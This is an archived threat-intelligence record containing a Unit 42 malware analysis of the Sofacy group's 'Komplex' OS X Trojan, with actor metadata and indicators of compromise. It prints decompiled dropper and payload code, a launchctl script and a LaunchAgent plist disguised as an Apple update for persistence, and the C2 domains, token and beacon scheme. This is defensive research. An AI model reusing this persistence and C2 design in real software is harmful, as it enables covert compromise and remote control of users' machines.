{
    "id": "c6abacad-5f23-4248-b658-138295648119",
    "created_at": "2023-01-12T14:59:00.935661Z",
    "updated_at": "2025-03-27T02:17:11.503977Z",
    "deleted_at": null,
    "sha1_hash": "8a25900c0d90e9379da3e7b618b2a9acc982e307",
    "title": "2016-09-26 - Sofacy’s ‘Komplex’ OS X Trojan",
    "authors": "",
    "file_creation_date": "2022-05-27T23:00:37Z",
    "file_modification_date": "2022-05-27T23:00:37Z",
    "file_size": 363525,
    "plain_text": "# Sofacy’s ‘Komplex’ OS X Trojan\n\n**[unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/](https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/)**\n\nDani Creus, Tyler Halfpop, Robert Falcone September 26, 2016\n\nBy [Dani Creus,](https://unit42.paloaltonetworks.com/author/dani-creus/) [Tyler Halfpop and](https://unit42.paloaltonetworks.com/author/tyler-halfpop/) [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nSeptember 26, 2016 at 11:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [aerospace,](https://unit42.paloaltonetworks.com/tag/aerospace/) [Komplex,](https://unit42.paloaltonetworks.com/tag/komplex/) [OS X,](https://unit42.paloaltonetworks.com/tag/os-x/) [Sofacy,](https://unit42.paloaltonetworks.com/tag/sofacy/) [Trojan](https://unit42.paloaltonetworks.com/tag/trojan/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/unit42-sofacys-komplex-os-x-trojan/)\n\nUnit 42 researchers identified a new OS X Trojan associated with the Sofacy group that we\nare now tracking with the 'Komplex' tag using the Palo Alto Networks AutoFocus threat\nintelligence platform.\n\nThe Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit, continues to\nadd to the variety of tools they use in attacks; in this case, targeting individuals in the\naerospace industry running the OS X operating system. During our analysis, we determined\nthat Komplex was used in a previous attack campaign targeting individuals running OS X\nthat exploited a vulnerability in the MacKeeper antivirus application to deliver Komplex as a\npayload. Komplex shares a significant amount of functionality and traits with another tool\n[used by Sofacy - the Carberp variant that Sofacy had used in previous attack campaigns on](https://blog.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/)\n\n\n-----\n\nsystems running Windows. In addition to shared code and functionality, we also discovered\nKomplex command and control (C2) domains that overlapped with previously identified\nphishing campaign infrastructures associated with the Sofacy group.\n\n## Komplex Binder\n\nKomplex is a Trojan that the Sofacy group created to compromise individuals using OS X\ndevices. The Trojan has multiple parts, first leading with a binder component that is\nresponsible for saving a second payload and a decoy document to the system. We found\nthree different versions of the Komplex binder, one that was created to run on x86, another\non x64, and a third that contained binders for both x86 and x64 architectures. We found the\nfollowing samples of the Komplex binder:\n\n\n1\n2\n3\n4\n5\n6\n\n\n2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134: MachO 64bit executable x86_64\nc1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7: MachO\nexecutable i386\ncffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4: Mach-O\nuniversal binary with 2 architectures\n\n\nRegardless of architecture, these initial binders all save a second embedded Mach-O file to\n‘/tmp/content’. This file is the Komplex dropper used in the next stage of installation and to\nmaintain persistence. After saving the Komplex dropper, these binders would then save a\nlegitimate decoy document to the system and open them using the ‘Preview’ application to\nminimize suspicion of any malicious activity. Figure 1 shows the main function found in one\nof the initial droppers that saves and opens a PDF decoy, as well as executes another\nexecutable file saved as ‘/tmp/content’.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nint _main(int arg0, int arg1) {\nvar_28 = [[NSAutoreleasePool alloc] init];\nvar_38 = [NSSearchPathForDirectoriesInDomains(0xf, 0x1, 0x1)\nobjectAtIndex:0x0];\nvar_40 = [NSString stringWithFormat:@\"%@/roskosmos_2015-2025.pdf\", var_38];\nvar_48 = [NSString stringWithFormat:@\"SetFile -a E %@/roskosmos_20152025.pdf\",\nvar_38];\nvar_50 = [NSString stringWithFormat:@\"rm -rf %@/roskosmos_2015-2025.app\",\nvar_38];\nvar_58 = [NSString stringWithFormat:@\"open -a Preview.app\n%@/roskosmos_20152025.pdf\", var_38];\n[[NSData dataWithBytes:_joiner length:0x20f74] writeToFile:@\"/tmp/content\"\natomically:0x1];\nsystem([var_50 UTF8String]);\nsystem(\"chmod 755 /tmp/content\");\n[[NSData dataWithBytes:_pdf length:0x182c82] writeToFile:var_40 atomically:0x1];\nsystem([var_48 UTF8String]);\nvar_70 = [[NSTask alloc] init];\n[var_70 setLaunchPath:@\"/tmp/content\"];\n[var_70 launch];\n[var_70 waitUntilExit];\nsystem([var_58 UTF8String]);\nremove(*arg1);\n[var_28 release];\nreturn 0x0;\n}\n\n\n_Figure 1 Main function within the Komplex binder_\n\nThe binder component saves a decoy document named roskosmos_2015-2025.pdf to the\nsystem and opens it using the Preview application built into OS X. Figure 2 shows a portion\nof the 17 page decoy document. This document is titled “Проект Федеральной\nкосмической программы России на 2016 - 2025 годы” and describes the Russian Federal\nSpace Program’s projects between 2016 and 2025. We do not have detailed targeting\ninformation regarding the Sofacy group's attack campaign delivering Komplex at this time;\nhowever, based on the contents of the decoy document, we believe that the target is likely\nassociated with the aerospace industry.\n\n\n-----\n\n_Figure 2 Decoy document opened by Komplex binder showing document regarding the_\n_Russian Space Program_\n\n## Komplex Dropper\n\nThe Komplex dropper component is saved to the system as “/tmp/content” (SHA256:\n96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3) and is\nresponsible for installing a third executable to the system and setting up persistence for the\nthird executable to launch each time the OS X operating system starts. This dropper also\nprovided the basis for the name “Komplex”, which is seen in several folder paths that were\nincluded within the Mach-O file, such as “/Users/kazak/Desktop/Project/komplex\".\n\nThe Komplex dropper is fairly straightforward from a functional perspective, as it contains all\nof its functionality within its “_main” function. The “_main” function (Figure 3) accesses data\nwithin three variables named ‘_Payload_1’, ‘_Payload_2’ and ‘_Payload_3’, and writes them\nto three files on the system.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nint _main(int arg0, int arg1) {\nvar_38 = [[NSAutoreleasePool alloc] init];\nvar_40 = [NSData dataWithBytes:_Payload_1 length:0x15c1c];\nvar_48 = [NSData dataWithBytes:_Payload_2 length:0x201];\nvar_50 = [NSData dataWithBytes:_Payload_3 length:0x4c];\nsystem(\"mkdir -p /Users/Shared/.local/ &> /dev/null\");\nsystem(\"mkdir -p ~/Library/LaunchAgents/ &> /dev/null\");\n[var_40 writeToFile:@\"/Users/Shared/.local/kextd\" atomically:0x1];\n[var_48 writeToFile:@\"/Users/Shared/com.apple.updates.plist\"\natomically:0x1];\n[var_50 writeToFile:@\"/Users/Shared/start.sh\" atomically:0x1];\nsystem(\"cp /Users/Shared/com.apple.updates.plist\n$HOME/Library/LaunchAgents/ &>/dev/null\");\nremove(\"/Users/Shared/com.apple.updates.plist\");\nsystem(\"chmod 755 /Users/Shared/.local/kextd\");\nsystem(\"chmod 755 /Users/Shared/start.sh\");\nvar_58 = [[NSTask alloc] init];\n[var_58 setLaunchPath:@\"/Users/Shared/start.sh\"];\n[var_58 launch];\n[var_58 waitUntilExit];\nremove(\"/Users/Shared/start.sh\");\nremove(*arg1);\n[var_38 release];\nreturn 0x0;\n}\n\n\n_Figure 3 Komplex Dropper's main function that drops three files to the system and runs a_\n_shell script_\n\nThe “_main” function writes the data within ‘_Payload_1’, ‘_Payload_2’, and ‘_Payload_3’\nvariables to the following files, respectively:\n\n1. /Users/Shared/.local/kextd (SHA256:\n\n227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5)\n2. /Users/Shared/com.apple.updates.plist (SHA256:\n\n1f22e8f489abff004a3c47210a9642798e1c53efc9d6f333a1072af4b11d71ef)\n3. /Users/Shared/start.sh (SHA256:\n\nd494e9f885ad2d6a2686424843142ddc680bb5485414023976b4d15e3b6be800)\n\nThe shell script saved to ‘/Users/Shared/start.sh’ calls the system command ‘launchctl’ to\nadd a plist entry into ‘launchd’ to automatically execute the Komplex payload each time the\nsystem starts. Figure 4 shows the contents of the ‘start.sh’ script that sets up persistence for\nthe payload.\n\n\n1\n2\n\n\n#!/bin/sh\nlaunchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist\n\n\n-----\n\n_Figure 4 Contents of the start.sh shell script that calls launchctl_\n\nThe ‘start.sh’ script loads ‘com.apple.updates.plist’, which sets the properties of the Komplex\npayload that is executed from “/Users/Shared/.local/kextd” at system start up courtesy of the\n“RunAtLoad” parameter. Figure 5 shows the contents of the ‘com.apple.updates.plist’ file\nloaded into ‘launchd’.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>Label</key>\n<string>com.apple.updates</string>\n<key>ProgramArguments</key>\n<array>\n<string>/Users/Shared/.local/kextd</string>\n</array>\n<key>KeepAlive</key>\n<false/>\n<key>RunAtLoad</key>\n<true/>\n<key>StandardErrorPath</key>\n<string>/dev/null</string>\n<key>StandardOutPath</key>\n<string>/dev/null</string>\n</dict>\n</plist>\n\n\n_Figure 5 Contents of the com.apple.updates.plist file showing how the dropper achieves_\n_persistence_\n\n## Komplex Payload\n\nThe ultimate purpose of the aforementioned components is to install and execute the\nKomplex payload. The dropper component saves the payload to \"/Users/Shared/.local/kextd\"\n(SHA256: 227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5) and\nultimately executes the payload. The payload begins by conducting an anti-debugging check\nto see if it is being debugged before proceeding with executing its main functionality, which\ncan be seen in the “AmIBeingDebugged” function in Figure 6. The “AmIBeingDebugged”\nfunction uses the “sysctl” function to check to see if a specific “P_TRACED” flag is set, which\nsignifies that the process is being debugged. A particularly interesting part of this function is\nthat it is very similar to the function provided by Apple to its developers in a guide created in\n2004 titled “Detecting the Debugger”. This is not the first time the Sofacy group's malware\nauthors have obtained techniques from publicly available sources, as demonstrated in the\nuse of the [Office Test Persistence Method that they obtained from a blog posted in 2014.](https://blog.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/)\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nint AmIBeingDebugged()() {\nvar_8 = **__stack_chk_guard;\ngetpid();\nif ((((sysctl(0x1, 0x4, var_2A8, 0x288, 0x0, 0x0) == 0x0 ? 0x1 : 0x0) ^ 0x1) & 0x1\n& 0xff) != 0x0) {\nrax = __assert_rtn(\"AmIBeingDebugged\",\n\"/Users/user/Desktop/LoaderWinApi/LoaderWinApi/main.mm\", 0x21, \"junk == 0\");\n}\nelse {\nvar_2C1 = (0x0 & 0x800) != 0x0 ? 0x1 : 0x0;\nif (**__stack_chk_guard == var_8) {\nrax = var_2C1 & 0x1 & 0xff;\n}\nelse {\nrax = __stack_chk_fail();\n}\n}\nreturn rax;\n}\n\n\n_Figure 6 The AmIBeingDebugged function used as an anti-analysis technique_\n\nAfter determining that it is not running in a debugger, the payload performs an antianalysis/sandbox check by issuing a GET request to Google, to check for Internet\nconnectivity. The payload will sleep until it receives a response from the HTTP requests to\nGoogle, which means Komplex will only communicate to its C2 servers in Internet enabled\nenvironments. Figure 7 shows the “connectedToInternet” function that confirms whether the\npayload is able to communicate with “http://www.google.com” before carrying out its\nfunctionality.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nint connectedToInternet()() {\nif ([NSData dataWithContentsOfURL:[NSURL\nURLWithString:@\"http://www.google.com\"]] != 0x0) {\nvar_1 = 0x1;\n}\nelse {\nvar_1 = 0x0;\n}\nrax = var_1 & 0x1 & 0xff;\nreturn rax;\n}\n\n\n_Figure 7 The connectedToInternet function testing for an active Internet connection_\n\nAfter confirming an active Internet connection, the Komplex payload begins carrying out its\nmain functionality. The Komplex payload uses an 11-byte XOR algorithm to decrypt strings\nused for configuration and within C2 communications, including the C2 domains themselves.\n\n\n-----\n\nFigure 8 shows a screenshot of Komplex s custom string decryption algorithm, along with the\nXOR key used to decrypt strings within the payload.\n\n_Figure 8 11-byte XOR algorithm used by Komplex to decrypt configuration strings_\n\nThe algorithm seen in Figure 8 decrypts the strings seen in Table 1, which the payload\nreferences using the associated variable names. The payload uses these decrypted strings\nfor a variety of purposes, such as command parsing and C2 server locations.\n\n**Variable Name** **Decrypted String**\n\nFILE_NAME FileName\n\nPATHTOSAVE PathToSave\n\nSTART_BLOCK_FILE [file]\n\nBLOCK_EXECUTE Execute\n\nBLOCK_DELETE Delete\n\nEND_BLOCK_FILE [/file]\n\nSERVERS appleupdate[.]org, apple-iclouds[.]net, itunes-helper[.]net\n\nMAC mac\n\nCONFIG config\n\n\n-----\n\nGET_CONFIG 1\n\nFILES file\n\nLOG log\n\nOLD_CONFIG 2\n\nID id\n\nTOKEN h8sn3vq6kl\n\nEXTENSIONS .xml .pdf, .htm, .zip\n\n_Table 1 Strings decrypted by Komplex and their referenced name_\n\nThe Komplex payload uses the SERVERS variable to obtain the location of its C2, which it\ncommunicates with using HTTP POST requests. The payload generates a URL to\ncommunicate with its C2 server that has the following structure:\n\n/<random path>/<random string>.<chosen extension>/?<random string>=<encrypted token>\n\nThe <chosen extension> portion of the URL is chosen at random from the list of legitimate\nfile extensions: .xml, .zip, .htm and .pdf. The <encrypted token> within the parameters of the\nURL is base64 encoded ciphertext created from the string ‘h8sn3vq6kl’. The ciphertext of the\nstring is generated via a custom algorithm that uses a random 4-byte integer as a key that is\nmodified by XOR with the static value 0xE150722. The payload also encrypts the data sent\nwithin the POST request using the same algorithm and encodes it using base64. Figure 9\nbelow shows an example HTTP POST sent from the payload to its C2 server.\n\n\n-----\n\n_Figure 9 Beacon sent from Komplex to C2 containing system information within the HTTP_\n_POST data_\n\nThe HTTP POST data in Figure 9 is comprised of information that the malware collects from\nthe infected system. The system information sent to the C2 includes data such as the system\nversion, username, and process list, which is gathered within a function named “getOsInfo”\nwithin the “InfoOS” class (Figure 10).\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nint InfoOS::getOsInfo()() {\nvar_38 = rdi;\nvar_18 = [[NSProcessInfo processInfo] operatingSystemVersionString];\nvar_20 = NSUserName();\nvar_28 = InfoOS::getProcessList();\nvar_30 = operator new[](strlen(var_28) + 0x200);\nsprintf(var_30, \"Mac OS X - %s %s\\nUser name - %s\\n\\t\\t\\t\\t\\t\\tProcess\nlist :\\n\\n%s\", [var_18 UTF8String], InfoOS::bitOS(), [var_20 UTF8String],\nvar_28);\nrax = var_30;\nreturn rax;\n}\n\n\n_Figure 10 getOsInfo function within Komplex that gathers system information for C2 beacon_\n\n\n-----\n\nThe Sofacy C2 server will respond to this HTTP request with encrypted data that the payload\nwill decrypt using the same custom algorithm used to encrypt the POST data. The Komplex\npayload will parse the C2 response for the following strings: \"[file]\" and \"[/file]\", \"FileName=\",\n\"PathToSave=\", \"Shell=\", \"Execute\", and \"Delete\". The \"Delete\" action does nothing more\nthan delete a file specified by 'PathToSave'/'FileName', whereas the \"Execute\" action\ninvolves running the following system commands before executing the specified file:\n\n\n1\n2\n\n\nmkdir -p &lt;'PathToSave'&gt; &amp;&gt; /dev/null\nchmod 755 &lt;'PathToSave'&gt;/&lt;'FileName'&gt; &amp;&gt; /dev/null\n\n\nThe payload will treat \"[file]\" and \"[/file]\" as delimiters that specify the data that the payload\nshould write to a specified file, which allows the threat actor to download additional files to\nthe system. Lastly, the payload can execute commands on the compromised system\nspecified within the \"Shell\" field, which the payload will execute and then send results back to\nthe C2.\n\n## Connections to Sofacy and Previous Attacks.\n\n**Code Overlaps**\n\nWhile reverse engineering the Komplex payload, we came across a few code overlaps that\nwe believed were worth exploring. First, we noticed striking similarities between the Komplex\npayload and the traits and behavior of an OS X Trojan discussed in a BAE Systems blog\ntitled [NEW MAC OS MALWARE EXPLOITS MACKEEPER. According to this blog post, an](http://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html)\nOS X Trojan was delivered via a vulnerability in the MacKeeper application. The nameless\nOS X Trojan uses an 11-byte XOR algorithm to decrypt an embedded configuration, which\nhas all of the same variable names and values as the Komplex sample (see Table 1). The\nalgorithm used to encrypt and decrypt the network traffic, as well as all static elements of the\nnetwork communications (composition of URL, structure of HTTP data, command parsing\nprocedure, etc.) discussed in the blog post are the exact same as seen in the Komplex\npayload. These overlaps suggest that the Trojan delivered by the MacKeeper vulnerability\nwas in fact the Komplex Trojan.\n\nThe second code overlap ties the Komplex Trojan to Sofacy’s Carberp variant, which we\n[have analyzed in previous research efforts. Even though Komplex was created to run on OS](https://blog.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/)\nX and Sofacy’s Carberp variant was developed to run on Windows, they share many\ncommonalities, including:\n\nSame URL generation logic using random path values, a random file extension and\nencrypted token\nSame file extensions used in C2 URL that are listed within the binaries in the same\norder\n\n\n-----\n\nSame algorithm used to encrypt and decrypt the token in the URL and HTTP POST\ndata (Carberp key is modified using value 0xAA7D756 whereas Komplex uses\n0xE150722)\nVery similar command handling, including parsing specifically for Execute, Delete, [file],\n\n[/file], FileName, and PathToSave.\nChecks for Internet connectivity by connecting to google.com\nUses an 11-byte XOR key to decrypt strings within the configuration\n\nIn addition to these common traits, we found a Sofacy Carberp variant (SHA256:\n638e7ca68643d4b01432f0ecaaa0495b805cc3cccc17a753b0fa511d94a22bdd) using the\nsame TOKEN value of ‘h8sn3vq6kl’ within its C2 URL, as observed in Komplex payloads.\nBased on these observations, we believe that the author of Sofacy’s Carberp variant used\nthe same code, or at least the same design, to create the Komplex Trojan. A benefit of\nretaining many of the same functionalities within the Windows and OS X Trojans is that it\nwould require fewer alterations to the C2 server application to handle cross-platform\nimplants.\n\n**Infrastructure Overlap**\n\nWhile Komplex’s C2 domain appleupdate[.]org does not appear to have any previously\nknown activity associated with it, both the apple-iclouds[.]net and itunes-helper[.]net domains\nhave direct ties to Sofacy activity. The apple-iclouds[.]net domain is mentioned within a PwC\nTactical Intelligence Bulletin that discussed a phishing campaign conducted by the Sofacy\ngroup. The itunes-helper[.]net domain is associated with separate activity discussed in Trend\nMicro’s blog titled [Looking Into a Cyber-Attack Facilitator in the Netherlands that included](http://blog.trendmicro.com/trendlabs-security-intelligence/looking-into-a-cyber-attack-facilitator-in-the-netherlands/)\nresearch on hosting providers used by Pawn Storm (Sofacy).\n\nThe domain appleupdate[.]org does have one interesting correlation point, specifically\ninvolving the IP 185.10.58[.]170 that resolved this domain between April 2015 through April\n2016. Researchers at BAE Systems provided Unit 42 the Komplex payload delivered through\nthe exploitation of MacKeeper (Dropper SHA256:\nda43d39c749c121e99bba00ce809ca63794df3f704e7ad4077094abde4cf2a73 and Payload\nSHA256: 45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54),\nwhich used the IP address 185.10.58[.]170 within its configuration as a C2 server. This\ninfrastructure overlap further strengthens the connection between the Komplex payload we\ndiscovered with the prior campaign using MacKeeper for delivery.\n\n## Conclusion\n\nThe Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X\noperating system – a move that showcases their continued evolution toward multi-platform\nattacks. The tool is capable of downloading additional files to the system, executing and\ndeleting files, as well as directly interacting with the system shell. While detailed targeting\ninformation is not currently available, we believe Komplex has been used in attacks on\n\n\n-----\n\nindividuals related to the aerospace industry, as well as attacks leveraging an exploit in\nMacKeeper to deliver the Trojan. The Komplex Trojan revealed a design similar to Sofacy’s\nCarberp variant Trojan, which we believe may have been done in order to handle\ncompromised Windows and OS X systems using the same C2 server application with\nrelative ease.\n\nWhile Unit 42 continues to research and track this threat, Palo Alto Networks customers are\nprotected via the following:\n\nWildFire correctly identifies known Komplex executables as malicious\nIPS signature #14442 Sofacy.Gen Command And Control Traffic can detect and block\noutbound C2 requests generated by the Komplex Trojan.\n[Customers can track this Trojan via the Komplex tag in AutoFocus.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Komplex)\n\n## IOCs:\n\n**Hashes:**\n\n2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134\n\nc1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7\n\ncffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4\n\n96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3\n\n227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5\n\n45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54\n\n**C2 Locations:**\n\nappleupdate[.]org\n\napple-iclouds[.]net\n\nitunes-helper[.]net\n\n185.10.58.170\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-09-26 - Sofacy’s ‘Komplex’ OS X Trojan.pdf"
    ],
    "report_names": [
        "2016-09-26 - Sofacy’s ‘Komplex’ OS X Trojan.pdf"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535540,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653692437,
    "ts_modification_date": 1653692437,
    "files": {
        "pdf": "https://archive.orkl.eu/8a25900c0d90e9379da3e7b618b2a9acc982e307.pdf",
        "text": "https://archive.orkl.eu/8a25900c0d90e9379da3e7b618b2a9acc982e307.txt",
        "img": "https://archive.orkl.eu/8a25900c0d90e9379da3e7b618b2a9acc982e307.jpg"
    }
}